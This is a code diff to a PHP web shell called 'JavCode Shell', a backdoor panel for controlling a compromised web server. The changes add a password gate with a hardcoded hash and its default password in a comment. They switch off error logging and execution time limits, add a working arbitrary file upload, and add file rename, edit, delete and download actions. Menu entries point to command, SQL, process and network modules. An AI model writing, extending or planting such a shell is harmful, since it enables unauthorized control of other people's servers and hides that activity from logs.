@@ -8,11 +8,37 @@ JavCode Shell
 
 $j_debug		= FALSE;
 $j_encrypted	= TRUE; // Akan mengenskripsi setiap gerakan ;'v
-$j_password		= "f1290186a5d0b1ceab27f4e77c0c5d68";
+$j_password		= "f1290186a5d0b1ceab27f4e77c0c5d68"; // default password : w
 $j_gethost		= $_SERVER['HTTP_HOST'];
 $j_judul		= "JavCode Shell - ".$j_gethost;
 
 Class JavCode{
+public function __construct(){
+	@session_start();
+	if($GLOBALS['j_debug'] === TRUE){
+		error_reporting(E_ALL);
+	}else{
+		error_reporting(0);
+	}
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+if (!isset($_SESSION[md5('javcode')]))
+	{
+	if (empty($GLOBALS['j_password']) || (isset($_POST['j_password']) && (md5($_POST['j_password'])) == $GLOBALS['j_password']))
+		{
+		$_SESSION[md5('javcode')] = true;
+		}
+	  else
+		{
+		echo '<form method="POST"><input type="text" placeholder="JavCode shell" name="j_password">';
+		echo '<input type="submit" value=">>"></form>';
+		exit;
+		}
+	}
+
+}
 public function safemode()
 {
 	if(ini_get('safe_mode') == 'on')
@@ -108,6 +134,19 @@ Class J_html{
 		$f.= "</a>";
 		return $f;
 	}
+	public function j_act($c)
+	{
+	if(is_array($c))
+	{
+		$a = "[ ";
+		foreach($c as $d=>$f)
+		{
+			$a.= " ".$this->a($d,'',$f)." ";  
+		}
+		$a.= " ]";
+	}
+	return $a;	
+	}
 	public function limenu($fz,$gansw)
 	{
 		$li = "<li>";
@@ -128,6 +167,14 @@ Class J_html{
 		}
 		$i.= ">";
 		return $i;
+	}
+	public function j_notif($text)
+	{
+		$j = "<div class=\"j_notif\" onclick=\"document.getElementById('j_notif').style.display='none';\"  id=\"j_notif\">";
+		$j.= "<span onclick=\"document.getElementById('j_notif').style.display='none';\" > X </span>";
+		$j.= $text;
+		$j.= "</div>";
+		return $j;
 	}
 }
 Class J_fileman{
@@ -220,14 +267,19 @@ $j_html->j_print($j_html->Head(
 ?>
 <script type="text/javascript">
 	function j_show(id){
-		document.getElementById(id).style.display='block';
+		document.getElementById(id).style.right=0;
 	}
 function j_check(source) {
   checkboxes = document.getElementsByName('files[]');
   for(var i=0, n=checkboxes.length;i<n;i++) {
     checkboxes[i].checked = source.checked;
+  	}
+	}
+  function j_close(close)
+  {
+  	document.getElementsById(close).style.display='none';
   }
-}
+
 </script>
 <?php
 $serverinfo = array('System :' => php_uname().'<br>',
@@ -246,39 +298,52 @@ $j_html->j_print('</div>');
 $j_html->j_print("<ul class=\"menu\">");
 $menu = array('Home' => '?',
 			 'Upload' => 'javascript:j_show(\'upload\')',
-			 'PHP' => '?',
-			 'Command' => '',
-			 'SQL' => '',
-			 'PS' => '',
-			 'String' => '',
-			 'Network' => '');
+			 'PHP' => '?a=php',
+			 'Command' => '?a=cmd',
+			 'SQL' => '?a=sql',
+			 'PS' => '?a=ps',
+			 'String' => '?a=str',
+			 'Network' => '?a=net',
+			 'LogOut' => '?a=logOUT'
+			  );
 foreach($menu as $m => $l)
 {
 	$j_html->j_print($j_html->limenu($l,$m));
 }
 $j_html->j_print("</ul>");
 $j_html->j_print("<div class='upload' id='upload'>");
-$j_html->j_print("<input type=\"file\" >");
-$j_html->j_print("</div>");
+$j_html->j_print("<form method='POST' enctype='multipart/form-data'>");
+$j_html->j_print($j_html->input('file','fupload','').$j_html->input('submit','','>>'));
+$j_html->j_print("</form></div>");
+if(isset($_FILES['fupload']['tmp_name']))
+{
+	if(@copy($_FILES['fupload']['tmp_name'],$getdir.'/'.$_FILES['fupload']['name'])){
+		$j_html->j_print($j_html->j_notif('Upload Successfully !'));
+	}
+}
 if(empty($_GET['a'])){
 
 $j_html->j_print($j_html->table(array('No','-','Files','Size','Type','Date Modif','Owner:Group','Permission','Actions')));
 $j_html->j_print($j_html->tr($j_html->td('*').$j_html->td($j_html->input('checkbox','files','',array('onclick' => 'j_check(this);'))).$j_html->td($j_film->j_link(array('?j=',dirname($getdir),'','','','','<< Parent Directory'))).$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('')));
 foreach($scndir as $dir)
 {if(!is_dir($getdir.'/'.$dir)|| $dir == '.'||$dir == '..')continue;
+$ll = '?j='.$j_film->Fz($getdir.'/'.$dir).'&a=';
+$act = array($ll.'ren' => 'ren',$ll.'del' => 'del');
 	$j_html->j_print($j_html->tr(
 		$j_html->td($num++).
 		$j_html->td($j_html->input('checkbox','files[]',$getdir.'/'.$dir)).
-		$j_html->td($j_film->j_link(array('?j=',$getdir.'/'.$dir,'','','','',$dir))).
+		$j_html->td('['.$j_film->j_link(array('?j=',$getdir.'/'.$dir,'','','','',$dir)).']').
 		$j_html->td($j_film->GetSize($getdir.'/'.$dir)).
 		$j_html->td($j_film->GetType($getdir.'/'.$dir)).
 		$j_html->td($j_film->GetLmod($getdir.'/'.$dir)).
 		$j_html->td($j_film->GetOwner($getdir.'/'.$dir).':'.$j_film->GetGroup($getdir.'/'.$dir)).
 		$j_html->td($j_film->GetPerms($getdir.'/'.$dir)).
-		$j_html->td('Actions')));
+		$j_html->td($j_html->j_act($act))));
 }
 foreach($scndir as $fil)
 {if(!is_file($getdir.'/'.$fil)|| $fil == '.' || $fil == '..')continue;
+$ll ='?j='.$j_film->Fz($getdir).'&f='.$j_film->Fz($fil).'&a=';
+$act = array($ll.'ren' => 'ren',$ll.'edit' => 'edit',$ll.'del' => 'del',$ll.'dl' => 'dl');
 	$j_html->j_print($j_html->tr(
 		$j_html->td($num++).
 		$j_html->td($j_html->input('checkbox','files[]',$getdir.'/'.$fil)).
@@ -288,7 +353,7 @@ foreach($scndir as $fil)
 		$j_html->td($j_film->GetLmod($getdir.'/'.$fil)).
 		$j_html->td($j_film->GetOwner($getdir.'/'.$fil).':'.$j_film->GetGroup($getdir.'/'.$fil)).
 		$j_html->td($j_film->GetPerms($getdir.'/'.$fil)).
-		$j_html->td('Actions')));
+		$j_html->td($j_html->j_act($act))));
 }
 $j_html->j_print($j_html->table('','',FALSE,TRUE));
 
@@ -299,5 +364,8 @@ $j = @$_GET['j'];
 if($a == 'view')
 {
 	$j_html->j_print($javcode->viewfile($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$j_film->Fz($f,$GLOBALS['j_encrypted'])));
+}elseif($a == 'logOUT'){
+		session_destroy();
+	$j_html->j_print("<script>alert('Bye ~~');location.href='?'</script>");
 }
 }
